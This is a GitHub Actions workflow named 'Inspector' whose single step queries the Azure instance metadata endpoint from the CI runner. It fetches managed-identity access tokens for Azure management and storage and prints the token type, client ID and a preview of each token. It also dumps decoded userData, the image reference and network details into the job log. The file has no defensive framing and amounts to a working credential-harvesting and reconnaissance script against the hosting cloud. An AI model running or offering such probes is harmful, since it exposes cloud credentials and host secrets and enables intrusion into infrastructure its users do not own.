name: Inspector
on:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  inspect:
    runs-on: ubuntu-latest
    steps:
      - name: Deep IMDS managed identity probe
        run: |
          echo "=== MANAGED IDENTITY INFO ==="
          curl -sf --max-time 8 \
            "http://169.254.169.254/metadata/identity/info?api-version=2019-08-01" \
            -H "Metadata: true" | python3 -m json.tool 2>/dev/null || echo "no identity info"

          echo ""
          echo "=== MANAGED IDENTITY TOKEN (management.azure.com) ==="
          RESP=$(curl -sf --max-time 8 \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/" \
            -H "Metadata: true" 2>&1)
          if echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print('TOKEN_TYPE:',d.get('token_type')); print('CLIENT_ID:',d.get('client_id','none')); print('TOK_PREVIEW:',d.get('access_token','')[:40])" 2>/dev/null; then
            echo "HAS MANAGED IDENTITY WITH AZURE MANAGEMENT ACCESS"
          else
            echo "Response: $RESP" | head -5
          fi

          echo ""
          echo "=== MANAGED IDENTITY TOKEN (storage.azure.com) ==="
          curl -sf --max-time 8 \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://storage.azure.com/" \
            -H "Metadata: true" -o /dev/null -w "HTTP: %{http_code}\n"

          echo ""
          echo "=== COMPUTE USER DATA ==="
          curl -sf --max-time 5 \
            "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text" \
            -H "Metadata: true" | base64 -d 2>/dev/null || echo "no userData or not base64"

          echo ""
          echo "=== IMAGE REFERENCE ==="
          curl -sf --max-time 5 \
            "http://169.254.169.254/metadata/instance/compute/storageProfile/imageReference?api-version=2021-02-01" \
            -H "Metadata: true" | python3 -m json.tool

          echo ""
          echo "=== NETWORK INTERFACES ==="
          curl -sf --max-time 5 \
            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" \
            -H "Metadata: true" | python3 -m json.tool
